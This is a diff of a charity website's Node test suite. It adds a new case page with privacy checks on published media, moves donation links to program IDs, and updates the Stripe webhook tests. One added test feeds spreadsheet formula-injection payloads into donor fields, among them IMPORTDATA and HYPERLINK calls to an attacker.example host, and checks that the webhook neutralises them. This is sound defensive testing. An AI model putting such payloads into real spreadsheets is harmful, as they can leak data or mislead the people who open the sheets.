-    ["Case 001", "Case 002", "Case 003", "Case 004", "Case 005", "Case 007", "Case 008"],
-  );
-  assert.deepEqual(
-    projects.filter((project) => !project.acceptsDonations).map((project) => project.date),
-    ["Case 006"],
-  );
+  const catalogContext = { window: {} };
+  runInNewContext(programSource, catalogContext);
+  const programs = JSON.parse(JSON.stringify(catalogContext.window.ONE_WORLD_RELIEF_DONATION_PROGRAMS));
+  assert.equal(programs.find((program) => program.id === "unrestricted").minAmount, 5);
 
-  const createElement = (tagName) => ({
-    tagName: String(tagName).toUpperCase(),
-    dataset: {},
-    children: [],
-    parentNode: null,
-    appendChild(child) {
-      child.parentNode = this;
-      this.children.push(child);
-      return child;
-    },
-    remove() {
-      if (!this.parentNode) {
-        return;
-      }
-      const index = this.parentNode.children.indexOf(this);
-      if (index >= 0) {
-        this.parentNode.children.splice(index, 1);
-      }
-      this.parentNode = null;
-    },
-  });
-  const createSelect = () => {
-    const select = createElement("select");
-    select.querySelectorAll = (selector) => {
-      assert.equal(selector, "[data-project-destination-group]");
-      return select.children.filter((child) => child.dataset.projectDestinationGroup);
-    };
-    return select;
-  };
-  const helperStart = siteJs.indexOf("  const getProjectDonationValue =");
+  const helperStart = siteJs.indexOf("  const buildQuickDonationUrl =");
   const helperEnd = siteJs.indexOf("  const setupReveals =", helperStart);
-  assert.ok(helperStart >= 0 && helperEnd > helperStart, "destination helpers should remain available");
+  assert.ok(helperStart >= 0 && helperEnd > helperStart, "quick donation URL helper should remain available");
   const helperContext = {
-    window: { ONE_WORLD_RELIEF_PROJECTS: projects },
-    document: { createElement },
     URLSearchParams,
   };
   runInNewContext(
     `${siteJs.slice(helperStart, helperEnd)}\n` +
-      "globalThis.__populateDonationDestinations = populateDonationDestinations;\n" +
       "globalThis.__buildQuickDonationUrl = buildQuickDonationUrl;",
     helperContext,
   );
-  const homeSelect = createSelect();
-  const donateSelect = createSelect();
-  helperContext.__populateDonationDestinations(homeSelect);
-  helperContext.__populateDonationDestinations(homeSelect);
-  helperContext.__populateDonationDestinations(donateSelect);
-  const summarizeDestinations = (select) => select.children.map((group) => ({
-    label: String(group.label),
-    options: group.children.map((option) => ({
-      value: String(option.value),
-      label: String(option.textContent),
-    })),
-  }));
-  const expectedDestinations = [
-    {
-      label: "Support areas",
-      options: [
-        { value: "Hafiz Student Support", label: "Hafiz Student Support" },
-        { value: "Father's Business Support", label: "Father's Business Support" },
-        { value: "Orphan Education", label: "Orphan Education" },
-        { value: "Feeding Madrasa for Orphan Kids", label: "Feeding Madrasa for Orphan Kids" },
-        { value: "Flood Relief", label: "Flood Relief" },
-      ],
-    },
-    {
-      label: "Upcoming goals",
-      options: [
-        { value: "Madrasa Water", label: "Madrasa Water" },
-        { value: "Mosque Tiles", label: "Mosque Tiles" },
-      ],
-    },
-  ];
-  assert.deepEqual(summarizeDestinations(homeSelect), expectedDestinations);
-  assert.deepEqual(summarizeDestinations(donateSelect), expectedDestinations);
-  const renderedDestinationValues = expectedDestinations.flatMap((group) => group.options.map((option) => option.value));
-  assert.equal(renderedDestinationValues.includes("Mosque Gate"), false);
 
   for (const amount of [5, 25, 50, 100, 73]) {
-    const campaign = amount === 73 ? "Madrasa Water" : "Where & help / now";
-    const quickUrl = helperContext.__buildQuickDonationUrl({ amount, campaign });
+    const quickUrl = helperContext.__buildQuickDonationUrl({ amount });
     const parsed = new URL(quickUrl, "https://one-world-relief.org/");
     assert.equal(parsed.pathname, "/donate.html");
     assert.equal(parsed.hash, "#donationForm");
     assert.equal(parsed.searchParams.get("amount"), String(amount));
-    assert.equal(parsed.searchParams.get("campaign"), campaign);
+    assert.equal(parsed.searchParams.get("program"), "unrestricted");
+    assert.equal(parsed.searchParams.has("campaign"), false);
     assert.equal(parsed.searchParams.has("frequency"), false);
     assert.equal(parsed.searchParams.has("giving_frequency"), false);
-    assert.match(quickUrl, /campaign=(?:Where\+%26\+help\+%2F\+now|Madrasa\+Water)/);
   }
 
   assert.match(siteCss, /\.quick-amounts input:focus-visible \+ span/);
@@ -902,11 +1116,11 @@ test("home page renders a continuous completed-case photo flow from project data
   const comingSoonCaseCount = [...projectData.matchAll(/status:\s*"Coming Soon"/g)].length;
   const activeCaseCount = totalCaseCount - completedCaseCount - comingSoonCaseCount;
   assert.equal(secondsPerProject, 14);
-  assert.equal(totalCaseCount, 8);
-  assert.equal(completedCaseCount, 6);
+  assert.equal(totalCaseCount, 9);
+  assert.equal(completedCaseCount, 7);
   assert.equal(activeCaseCount, 0);
   assert.equal(comingSoonCaseCount, 2);
-  assert.equal(completedCaseCount * secondsPerProject, 84);
+  assert.equal(completedCaseCount * secondsPerProject, 98);
   assert.match(siteCss, /will-change: transform/);
   assert.match(siteCss, /--case-flow-start-offset: clamp\(-3rem, -2\.5vw, -1\.25rem\)/);
   assert.match(siteCss, /padding: 0\.8rem clamp\(1rem, 4vw, 4rem\) 1\.4rem/);
@@ -927,7 +1141,7 @@ test("home page renders a continuous completed-case photo flow from project data
 
 test("mobile layouts retain navigation and use contained, touch-friendly static flows", async () => {
   const rootPageNames = ["index.html", "projects.html", "donate.html", "share.html", "about.html", "contact.html"];
-  const casePageNames = Array.from({ length: 8 }, (_, index) => {
+  const casePageNames = Array.from({ length: 9 }, (_, index) => {
     return `projects/case-${String(index + 1).padStart(3, "0")}.html`;
   });
   const [pages, offlineHtml, siteJs, siteCss] = await Promise.all([
@@ -941,7 +1155,7 @@ test("mobile layouts retain navigation and use contained, touch-friendly static 
   ]);
 
   const publicPages = [...pages, { name: "offline.html", html: offlineHtml }];
-  assert.equal(publicPages.length, 15);
+  assert.equal(publicPages.length, 16);
   for (const { name, html } of publicPages) {
     assert.match(
       html,
@@ -1129,6 +1343,7 @@ test("project cards publish approved cases with embedded local media", async () 
     caseSixPage,
     caseSevenPage,
     caseEightPage,
+    caseNinePage,
   ] = await Promise.all([
     readFile("project-data.js", "utf8"),
     readFile("one-world-relief.js", "utf8"),
@@ -1141,6 +1356,7 @@ test("project cards publish approved cases with embedded local media", async () 
     readFile("projects/case-006.html", "utf8"),
     readFile("projects/case-007.html", "utf8"),
     readFile("projects/case-008.html", "utf8"),
+    readFile("projects/case-009.html", "utf8"),
   ]);
 
   assert.doesNotMatch(projectData, /drive\.google\.com/);
@@ -1153,6 +1369,7 @@ test("project cards publish approved cases with embedded local media", async () 
   assert.match(projectData, /projects\/case-006\.html/);
   assert.match(projectData, /projects\/case-007\.html/);
   assert.match(projectData, /projects\/case-008\.html/);
+  assert.match(projectData, /projects\/case-009\.html/);
   assert.doesNotMatch(projectData, /Village Qurbani Meal Support/);
   assert.doesNotMatch(projectData, /Two-Year Orphan Education Support/);
   assert.doesNotMatch(projectData, /Food Stand for a Father/);
@@ -1169,11 +1386,13 @@ test("project cards publish approved cases with embedded local media", async () 
   assert.match(projectData, /A Secure Gate for a Community Mosque/);
   assert.match(projectData, /Water for a Madrasa Mosque/);
   assert.match(projectData, /Tiles to Help Finish a Mosque/);
+  assert.match(projectData, /Twenty Ceiling Fans for a New Mosque/);
   assert.match(projectData, /orphan-support-001-thumbnail\.jpg/);
   assert.match(projectData, /livelihood-support-002-thumbnail\.jpg/);
   assert.match(projectData, /orphan-education-003-thumbnail\.jpg/);
   assert.match(projectData, /flood-relief-005-thumbnail\.jpg/);
   assert.match(projectData, /mosque-gate-006-thumbnail\.jpg/);
+  assert.match(projectData, /mosque-fans-009-thumbnail\.jpg/);
   assert.match(projectData, /thumbnailType: "banner"/);
   assert.doesNotMatch(projectData, /orphan-education-003-placeholder\.svg/);
   assert.doesNotMatch(projectData, /korbani-village-004-placeholder\.svg/);
@@ -1334,7 +1553,6 @@ test("project cards publish approved cases with embedded local media", async () 
     assert.match(entry, /amountRaised: "Budget coming soon"/);
     assert.match(entry, /thumbnailType: "banner"/);
     assert.match(entry, /thumbnailLabel: "Coming Soon"/);
-    assert.match(entry, /campaign=General%20Fund/);
     assert.match(page, /Coming Soon/);
     assert.match(page, /To be announced/);
     assert.match(page, /timeline-step-pending/);
@@ -1342,6 +1560,13 @@ test("project cards publish approved cases with embedded local media", async () 
   }
   assert.match(caseSevenPage, /Water for a madrasa mosque/);
   assert.match(caseEightPage, /Tiles to help finish a mosque/);
+  assert.match(caseSevenData, /program=water_support&variant=water_station&amount=350&referrer=case-007/);
+  assert.match(caseEightData, /program=mosque_build&amount=1000&referrer=case-008/);
+  assert.match(caseSevenPage, /program=water_support&amp;variant=water_station&amp;amount=350&amp;referrer=case-007/);
+  assert.match(caseEightPage, /program=mosque_build&amp;amount=1000&amp;referrer=case-008/);
+  assert.doesNotMatch(`${caseSevenData}\n${caseEightData}`, /campaign=General%20Fund/);
+  assert.match(caseNinePage, /<h1>Twenty Ceiling Fans for a New Mosque<\/h1>/);
+  assert.match(caseNinePage, /Case 009/);
   assert.match(siteJs, /const comingSoon =/);
   assert.match(siteJs, /<span>\$\{comingSoon\} coming soon<\/span>/);
   assert.match(siteJs, /project\.thumbnailLabel \|\| "Current Case"/);
@@ -1365,6 +1590,84 @@ test("project cards publish approved cases with embedded local media", async () 
     assert.equal(media.subarray(4, 8).toString("ascii"), "ftyp", `${filename} should be an ISO MP4`);
     assert.ok(media.includes(Buffer.from("avc1")), `${filename} should use browser-safe H.264 video`);
     assert.ok(media.includes(Buffer.from("mp4a")), `${filename} should use browser-safe AAC audio`);
+  }
+});
+
+test("Case 009 publishes verified mosque-fan proof without private correspondence or image metadata", async () => {
+  const [projectDataSource, casePage, mediaReadme] = await Promise.all([
+    readFile("project-data.js", "utf8"),
+    readFile("projects/case-009.html", "utf8"),
+    readFile("assets/projects/README.md", "utf8"),
+  ]);
+  const projectContext = { window: {} };
+  runInNewContext(projectDataSource, projectContext);
+  const projects = JSON.parse(JSON.stringify(projectContext.window.ONE_WORLD_RELIEF_PROJECTS));
+  const caseNine = projects.find((project) => project.date === "Case 009");
+
+  assert.equal(projects.length, 9);
+  assert.equal(projects.filter((project) => project.status === "Completed").length, 7);
+  assert.ok(caseNine, "Case 009 should be present in shared project data");
+  assert.deepEqual(
+    {
+      title: caseNine.title,
+      category: caseNine.category,
+      status: caseNine.status,
+      location: caseNine.location,
+      amountRaised: caseNine.amountRaised,
+      acceptsDonations: caseNine.acceptsDonations,
+      thumbnailUrl: caseNine.thumbnailUrl,
+      mediaUrl: caseNine.mediaUrl,
+    },
+    {
+      title: "Twenty Ceiling Fans for a New Mosque",
+      category: "Mosque Support",
+      status: "Completed",
+      location: "Bangladesh",
+      amountRaised: "Cost not publicly listed",
+      acceptsDonations: false,
+      thumbnailUrl: "assets/projects/case-009/mosque-fans-009-thumbnail.jpg",
+      mediaUrl: "projects/case-009.html",
+    },
+  );
+  assert.match(caseNine.impact, /20 ceiling fans installed/);
+  assert.match(caseNine.update, /September 24, 2025/);
+  assert.equal(caseNine.donationUrl, "donate.html?program=mosque_build&amount=1000&referrer=case-009#donationForm");
+
+  assert.match(casePage, /<title>One World Relief \| Twenty Ceiling Fans for a New Mosque<\/title>/);
+  assert.match(casePage, /<meta name="description" content="Completed Case 009 documenting 20 ceiling fans installed at a newly built mosque in Bangladesh\." \/>/);
+  assert.match(casePage, /<strong>Not publicly listed<\/strong>/);
+  assert.match(casePage, /<strong>September 24, 2025<\/strong>/);
+  assert.match(casePage, /<time datetime="2025-09-24">September 24, 2025<\/time>/);
+  assert.match(casePage, /The supplied project record confirms a donation of 20 ceiling fans/);
+  assert.match(casePage, /does not\s+estimate either figure/);
+  assert.match(casePage, /Private correspondence, phone numbers, donor names, and embedded photo\s+metadata are not included/);
+  assert.match(casePage, /program=mosque_build&amp;amount=1000&amp;referrer=case-009#donationForm/);
+  assert.match(mediaReadme, /case-009\/.*metadata-stripped.*20 ceiling fans/);
+  assert.match(mediaReadme, /private correspondence with a phone number remains unpublished/);
+
+  const publicCaseText = `${JSON.stringify(caseNine)}\n${casePage}`;
+  assert.doesNotMatch(publicCaseText, /(?:\+?88)?01[3-9]\d{8}/, "Bangladesh phone numbers must remain private");
+  assert.doesNotMatch(publicCaseText, /href="tel:|Facebook\.html|\.download|Request for Donation of Tiles/i);
+  assert.doesNotMatch(publicCaseText, /\b\d{15,}\b/, "source-system or identity numbers must not be published");
+
+  const jpegFiles = [
+    "mosque-fans-009-thumbnail.jpg",
+    "mosque-fans-009-main.jpg",
+    "mosque-fans-009-proof.jpg",
+  ];
+  assert.match(casePage, /mosque-fans-009-main\.jpg/);
+  assert.match(casePage, /mosque-fans-009-proof\.jpg/);
+  assert.doesNotMatch(casePage, /src="[^"]+\.(?:html|download|webp)"/i);
+
+  for (const filename of jpegFiles) {
+    const media = await readFile(`assets/projects/case-009/${filename}`);
+    const metadataText = media.toString("latin1");
+    assert.ok(media.byteLength > 50_000, `${filename} should contain a usable image`);
+    assert.ok(media.byteLength < 1_500_000, `${filename} should remain web-sized`);
+    assert.deepEqual([...media.subarray(0, 3)], [0xff, 0xd8, 0xff], `${filename} should have a JPEG signature`);
+    assert.deepEqual([...media.subarray(-2)], [0xff, 0xd9], `${filename} should be a complete JPEG`);
+    assert.doesNotMatch(metadataText, /Exif|GPS|Photoshop 3\.0|http:\/\/ns\.adobe\.com\/xap/i, `${filename} should not retain sensitive image metadata`);
+    assert.doesNotMatch(metadataText, /(?:\+?88)?01[3-9]\d{8}/, `${filename} should not embed a phone number`);
   }
 });
 
@@ -1471,7 +1774,7 @@ test("stripe webhook sends custom OneWorld Relief receipt email when configured"
       object: {
         id: "cs_test_123",
         created: 1770000000,
-        amount_total: 100,
+        amount_total: 35000,
         payment_status: "paid",
         customer_email: "donor@example.com",
         client_reference_id: "don_123",
@@ -1480,7 +1783,10 @@ test("stripe webhook sends custom OneWorld Relief receipt email when configured"
           donation_id: "don_123",
           donor_name: "Test Donor",
           donor_email: "donor@example.com",
-          campaign: "General Fund",
+          campaign: "Water Support",
+          program_id: "water_support",
+          program_variant: "water_station",
+          referrer_case: "case-009",
           donor_note: "For school supplies",
           anonymous_public: "yes",
         },
@@ -1548,7 +1854,10 @@ test("stripe webhook sends custom OneWorld Relief receipt email when configured"
     assert.match(emailPayload.text, /OneWorld Relief\nEIN: 41-5079927/);
     assert.match(emailPayload.text, /Receipt ID: R-2026-02-02-/);
     assert.match(emailPayload.text, /Donor Name: Test Donor/);
-    assert.match(emailPayload.text, /Amount: \$1\.00/);
+    assert.match(emailPayload.text, /Amount: \$350\.00/);
+    assert.match(emailPayload.text, /Designation: Water Support/);
+    assert.match(emailPayload.text, /Program option: Filtered Water Station/);
+    assert.doesNotMatch(emailPayload.text, /Program option: water_station/);
     assert.match(emailPayload.text, /No goods or services were provided/);
 
     const sheetReadCall = calls.find((call) => call.url.includes("sheets.googleapis.com") && !call.url.includes(":append"));
@@ -1560,15 +1869,129 @@ test("stripe webhook sends custom OneWorld Relief receipt email when configured"
       "don_123",
       "2/2/2026",
       "Test Donor",
-      1,
-      "General Fund",
+      350,
+      "Water Support",
       "Stripe",
       "R-2026-02-02-DON123",
     ]);
     assert.match(sheetPayload.values[0][7], /Receipt Email: sent/);
     assert.match(sheetPayload.values[0][7], /Payment Intent: pi_test_123/);
+    assert.match(sheetPayload.values[0][7], /Program ID: water_support/);
+    assert.match(sheetPayload.values[0][7], /Program Option: Filtered Water Station/);
+    assert.match(sheetPayload.values[0][7], /Program Variant ID: water_station/);
+    assert.match(sheetPayload.values[0][7], /Referrer Case: case-009/);
     assert.match(sheetPayload.values[0][7], /Public Display: Anonymous/);
     assert.match(sheetPayload.values[0][7], /Donor Note: For school supplies/);
+  } finally {
+    globalThis.fetch = originalFetch;
+  }
+});
+
+test("stripe webhook neutralizes formula-like Google Sheets cells without changing ordinary values", async () => {
+  const [deployedSource, mirrorSource] = await Promise.all([
+    readFile("functions/charity/webhooks/stripe.js", "utf8"),
+    readFile("../functions/charity/webhooks/stripe.js", "utf8"),
+  ]);
+  assert.equal(deployedSource, mirrorSource, "Stripe webhook mirrors must remain byte-identical");
+
+  const webhook = await importFunctionModule("functions/charity/webhooks/stripe.js");
+  const originalFetch = globalThis.fetch;
+  const secret = "whsec_formula_test";
+  const timestamp = "1770000000";
+  const calls = [];
+
+  globalThis.fetch = async (url, options) => {
+    calls.push({ url: String(url), options });
+    if (String(url).includes("oauth2.googleapis.com")) {
+      return new Response(JSON.stringify({ access_token: "google-token" }), {
+        status: 200,
+        headers: { "Content-Type": "application/json" },
+      });
+    }
+    if (String(url).includes("sheets.googleapis.com") && !String(url).includes(":append")) {
+      return new Response(JSON.stringify({ values: [["Donation ID", "Date", "Donor Name", "Amount ($)", "Purpose/Fund", "Method", "Receipt ID", "Notes"]] }), {
+        status: 200,
+        headers: { "Content-Type": "application/json" },
+      });
+    }
+    if (String(url).includes("sheets.googleapis.com") && String(url).includes(":append")) {
+      return new Response(JSON.stringify({ updates: { updatedRows: 1 } }), {
+        status: 200,
+        headers: { "Content-Type": "application/json" },
+      });
+    }
+    throw new Error(`Unexpected fetch ${url}`);
+  };
+
+  try {
+    const privateKey = await createGooglePrivateKey();
+    const deliver = async ({ sessionId, donationId, donorName, campaign }) => {
+      const body = JSON.stringify({
+        id: `evt_${sessionId}`,
+        type: "checkout.session.completed",
+        data: {
+          object: {
+            id: sessionId,
+            created: 1770000000,
+            amount_total: 2500,
+            payment_status: "paid",
+            customer_email: "formula-test@example.com",
+            client_reference_id: donationId,
+            metadata: {
+              donation_id: donationId,
+              donor_name: donorName,
+              donor_email: "formula-test@example.com",
+              campaign,
+              donor_note: "=not a cell-leading formula",
+            },
+          },
+        },
+      });
+      const signature = createHmac("sha256", secret).update(`${timestamp}.${body}`).digest("hex");
+      const response = await webhook.onRequestPost({
+        request: new Request("https://one-world-relief.org/charity/webhooks/stripe", {
+          method: "POST",
+          headers: { "stripe-signature": `t=${timestamp},v1=${signature}` },
+          body,
+        }),
+        env: {
+          OWR_STRIPE_WEBHOOK_SECRET: secret,
+          OWR_GOOGLE_SHEET_ID: "sheet_123",
+          OWR_GOOGLE_SERVICE_ACCOUNT_EMAIL: "service@example.iam.gserviceaccount.com",
+          OWR_GOOGLE_PRIVATE_KEY: privateKey,
+        },
+      });
+      assert.equal(response.status, 200);
+    };
+
+    await deliver({
+      sessionId: "cs_formula_1",
+      donationId: "=IMPORTDATA(\"https://attacker.example\")",
+      donorName: "  +SUM(1,1)",
+      campaign: "-1+1",
+    });
+    await deliver({
+      sessionId: "cs_formula_2",
+      donationId: "safe_donation_id",
+      donorName: "@HYPERLINK(\"https://attacker.example\")",
+      campaign: "General Fund",
+    });
+
+    const appendCalls = calls.filter((call) => call.url.includes("sheets.googleapis.com") && call.url.includes(":append"));
+    assert.equal(appendCalls.length, 2);
+    const firstRow = JSON.parse(appendCalls[0].options.body).values[0];
+    const secondRow = JSON.parse(appendCalls[1].options.body).values[0];
+    assert.equal(firstRow[0], "'=IMPORTDATA(\"https://attacker.example\")");
+    assert.equal(firstRow[2], "'  +SUM(1,1)");
+    assert.equal(firstRow[4], "'-1+1");
+    assert.equal(secondRow[2], "'@HYPERLINK(\"https://attacker.example\")");
+    assert.equal(firstRow[1], "2/2/2026");
+    assert.equal(firstRow[3], 25);
+    assert.equal(firstRow[5], "Stripe");
+    assert.match(firstRow[7], /Donor Note: =not a cell-leading formula/);
+    for (const row of [firstRow, secondRow]) {
+      assert.equal(row.some((cell) => typeof cell === "string" && /^[=+\-@]/.test(cell.trim())), false);
+    }
   } finally {
     globalThis.fetch = originalFetch;
   }
